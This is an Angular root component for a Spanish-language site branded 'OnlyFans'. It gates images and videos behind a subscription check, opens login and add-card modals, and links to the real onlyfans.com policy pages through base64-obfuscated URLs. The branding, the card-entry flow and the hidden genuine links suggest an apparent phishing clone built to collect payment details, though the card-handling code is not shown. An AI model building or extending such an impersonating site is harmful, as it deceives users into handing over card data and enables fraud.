import { CommonModule } from '@angular/common';
import { Component, inject, OnInit, signal } from '@angular/core';
import { ModalComponent } from "./shared/modal/modal.component";
import { ModalService } from './services/modal.service';
import { AddCardModalComponent } from "./shared/add-card-modal/add-card-modal.component";
import { InitialAnimationComponent } from "./shared/animations/initial-animation/initial-animation.component";
import { SuscriptionService } from './services/suscription.service';
import { AuthService } from './services/auth.service';

@Component({
  selector: 'app-root',
  imports: [CommonModule, ModalComponent, AddCardModalComponent, InitialAnimationComponent],
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export default class AppComponent implements OnInit {
  modalService = inject(ModalService);
  authService = inject(AuthService);
  suscriptionService = inject(SuscriptionService);

  title = 'OnlyFans';
  activeSection = signal<number>(1);
  initialLoading = signal<boolean>(true);
  styles = signal<any>({});
  mediaStyles = signal<any>({});

  images = [
    "/assets/image4.jpg",
    "/assets/image2.jpg",
    "/assets/image3.jpg"
  ];

  videos = [
    "/assets/video1.mp4",
  ];

  getBackgroundStyle(item: string) {
    return this.suscriptionService.activeSubscription()?.activeSub ? {
      'height': '100vh',
      'background-image': `url(${item})`,
      'background-size': `cover`,
      'background-repeat': 'no-repeat'
    } : {
      'background-image': `url(/assets/lockedbg.png)`,
      'height': '50%',
    };
  }

  getBackgroundMediaStyle(item: string) {
    return this.suscriptionService.activeSubscription()?.activeSub ? {
      'height': '100%',
    } : {
      'background-image': `url(/assets/lockedbg.png)`,
      'height': '50%',
    }
  }

  
  guessMenuOptions = [
    {
      url: '#',
      icon: 'fa fa-sign-in',
      title: 'Iniciar sesión',
      action: () => {
        this.modalService.toggleModal();
      }
    }
  ]

  userMenuOptions = [
    /* {
      url: '#',
      icon: 'fa fa-home',
      title: 'Inicio',
    },
    {
      url: '#',
      icon: 'fa fa-bookmark',
      title: 'Colecciones',
    }, */
    /* {
      url: '#',
      icon: 'fas fa-user-friends',
      title: 'Suscripciones',
    }, */
    /* {
      url: '#',
      icon: 'fa fa-credit-card',
      title: 'Añadir tarjeta',
    },*/
    {
      url: '#',
      icon: 'fas fa-sign-out',
      title: 'Cerrar sesión',
      action: () => {
        this.authService.logout()
        this.modalService.logout()
      }
    }, 

  ]

  ngOnInit(): void {
    const checkSubscription = setInterval(() => {
      if (this.suscriptionService.activeSubscription() !== null) {
        clearInterval(checkSubscription); // Stop checking once we have data
        setTimeout(() => {
          this.initialLoading.set(false);
        }, 7000)
      }
    }, 500);
  }

  changeSection(section: number) {
    if (this.activeSection() != section) {
      this.activeSection.set(section);
    }
  }

  privacyPolicies() {
    event?.preventDefault();
    window.location.href = atob("aHR0cHM6Ly9vbmx5ZmFucy5jb20vcHJpdmFjeQ==");
  }

  cookiesNotice() {
    event?.preventDefault();
    window.location.href = atob("aHR0cHM6Ly9vbmx5ZmFucy5jb20vY29va2llcw==");
  }

  terms() {
    event?.preventDefault();
    window.location.href = atob("aHR0cHM6Ly9vbmx5ZmFucy5jb20vdGVybXM=");
  }

  subscribe() {
    console.log(this.modalService.logged())
    console.log(this.suscriptionService.activeSubscription())
    if(this.modalService.logged() === false) {
      this.modalService.toggleModal()
    } else if(this.modalService.logged() === true && this.suscriptionService.activeSubscription()?.activeSub === false) {
      this.modalService.toggleAddCardModal();
    }
  }
}
